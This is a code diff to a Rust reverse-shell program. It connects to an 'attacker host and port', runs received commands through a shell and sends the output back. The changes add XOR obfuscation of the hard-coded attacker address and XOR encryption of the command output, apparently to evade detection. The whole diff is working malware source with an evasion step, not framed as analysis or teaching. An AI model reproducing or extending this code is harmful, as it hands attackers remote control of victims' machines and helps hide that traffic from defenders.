@@ -9,17 +9,20 @@ fn int_xor(clear_text: &str, key: u8) -> String{
 	let mut enc_text = "".to_string();
 	for chr in clear_text.chars() {
 		if chr.to_string() == "\n" {
-			break;
+			enc_text = enc_text + &chr.to_string();
 		}
-		let tmp = chr as u8 ^ key;
-		let chr = tmp as char;
-		enc_text = enc_text + &chr.to_string();
+		else {
+			let tmp = chr as u8 ^ key;
+			let chr = tmp as char;
+			enc_text = enc_text + &chr.to_string();
+		}
 	}
 	return enc_text;
 }
 
 fn main() {
-	let addr = "127.0.0.1:8888"; // Attacker host and port. EDIT here
+	let key: u8 = 16;
+	let addr = &*int_xor("!\"\'> > >!*((((", key); // Attacker host and port. EDIT here
 	loop {
 		match TcpStream::connect(addr) { // Try create TCP connection
 			Ok(mut conn) => { // If connected
@@ -31,7 +34,7 @@ fn main() {
 							/* Remove Null byte in command (Error while running commands*/
 							/* https://stackoverflow.com/a/49406848 */
 							command = command.trim_matches(char::from(0));
-							let tmp = int_xor(command, 16);
+							let tmp = int_xor(command, key);
 							command = &*tmp;
 							if command == "exit\n" {
 								break;
@@ -45,7 +48,7 @@ fn main() {
 								} else {
 									Command::new("sh").arg("-c").arg(command).output().unwrap()
 								};
-								conn.write(&output.stdout).unwrap();
+								conn.write(int_xor(from_utf8(&output.stdout).unwrap(), key).as_bytes()).unwrap();
 							}
 						},
 						Err(_) => {}
